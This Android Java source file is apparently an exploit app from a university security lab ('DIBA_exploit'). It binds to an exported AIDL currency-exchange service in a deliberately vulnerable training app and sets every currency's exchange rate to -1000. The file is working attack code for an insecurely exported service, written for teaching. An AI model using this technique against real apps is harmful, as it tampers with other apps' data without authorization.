package ch.zhaw.securitylab.DIBA_exploit;

import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import ch.zhaw.securitylab.DIBA.AidlServiceCurrencyExchange;

public class ActivityInsecureServices extends AppCompatActivity {

    private static final String packageName = "ch.zhaw.securitylab.DIBA";
    private boolean bound;
    private AidlServiceCurrencyExchange service;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_insecure_services);
        Button button = findViewById(R.id.change_exchange);
        button.setOnClickListener(onChangeExchangeRate());
    }


    private View.OnClickListener onChangeExchangeRate() {

        return (View v) -> {
            new Thread(() -> {
                while (!bound) {
                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }

                try {
                    for (String currency : service.getCurrencies()) {
                        changeExchangeRate("-1000", currency);
                    }
                } catch (RemoteException e) {
                    throw new RuntimeException(e);
                }
            }).start();
        };
    }

    // -------------------------------------------- //
    // CURRENCY EXCHANGE SERVICE
    // -------------------------------------------- //

    @Override
    protected void onStart() {
        super.onStart();
        // Bind to LocalService
        String className = "ch.zhaw.securitylab.DIBA.service.ServiceCurrencyExchange";

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName, className));
        bindService(intent, Connection, BIND_AUTO_CREATE);
    }

    @Override
    protected void onStop() {
        super.onStop();
        unbindService(Connection);
        bound = false;
    }

    private void boundOrThrow()
    {
        if (!bound) throw new RuntimeException("No service bound");
    }

    private void changeExchangeRate(String exchangeRate, String currency) {
        boundOrThrow();
        try {
            service.changeExchangeRate(exchangeRate, currency);
        } catch (RemoteException e) {
            throw new RuntimeException(e.getMessage());
        }
    }

    private ServiceConnection Connection = new ServiceConnection() {
        // Called when the connection with the service is established
        public void onServiceConnected(ComponentName className, IBinder localService) {
            // Following the example above for an AIDL interface,
            // this gets an instance of the IRemoteInterface, which we can use to call on the service
            service = AidlServiceCurrencyExchange.Stub.asInterface(localService);
            bound = true;
        }

        // Called when the connection with the service disconnects unexpectedly
        public void onServiceDisconnected(ComponentName className) {
            service = null;
            bound = false;
        }
    };
}